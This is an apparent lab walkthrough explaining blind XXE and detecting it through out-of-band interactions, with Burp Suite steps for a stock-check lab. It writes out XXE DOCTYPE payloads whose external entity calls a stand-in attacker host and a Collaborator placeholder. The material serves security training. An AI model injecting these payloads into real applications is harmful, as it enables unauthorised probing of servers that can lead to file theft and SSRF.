# Exploiting XXE to Extract Files, Perform SSRF, and Handle Blind XXE ðŸš¨

XXE (XML External Entity) is a vulnerability that allows attackers to extract files from a server, perform SSRF attacks, and exploit "Blind" XXE vulnerabilities. This guide covers all these scenarios with detailed examples. ðŸ’¡

## Part 1: What is Blind XXE?

Blind XXE occurs when an application is vulnerable to XXE but does not return the values of any external entities in its responses. This makes direct data extraction impossible, and such vulnerabilities are harder to exploit than typical XXE.

### Key Methods to Detect and Exploit Blind XXE:

1. Initiate out-of-band (OAST) network interactions, which may allow extracting sensitive data from such interactions.
2. Trigger XML parsing errors that include sensitive data in the error messages.

### Detecting Blind XXE Using Out-of-Band Methods

Blind XXE can often be detected by initiating an out-of-band network interaction with a system you control. For example:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Use the defined entity in the XML data values. This approach forces the server to make an HTTP request to the specified URL, which the attacker can monitor for DNS lookups and HTTP requests.

## Example Lab Exercise

In this lab, the "Check Stock" function analyzes XML input data but does not display the result. You can detect a blind XXE vulnerability by initiating interaction with an external domain.

### Steps to Perform the Attack

### 1. Select a Product
Open the list of products and choose any item:

---

### 2. Click the Button
On the product page, click the **"Check Stock"** button after enabling a proxy tool (e.g., Burp Suite):

---

### 3. Intercept the Request
Go to **Proxy â†’ HTTP History**, locate the POST request to `/product/stock`, and send it to **Repeater**:

---

### 4. Inject the Payload ðŸš€

Insert the following external entity definition between the XML declaration and the `stockCheck` element. Use **Burp Collaborator** to insert your own subdomain where `BURP-COLLABORATOR-SUBDOMAIN` is indicated:
```xml
<!DOCTYPE stockCheck [ <!ENTITY eyes SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```

Replace the `productId` value with `&eyes;`:

---

### 5. Check Collaborator
Switch to the **Collaborator** tab and click **"Poll now"**. If interactions are not visible, wait a few seconds and try again. You should see DNS and HTTP interactions initiated by the application as a result of your payload.
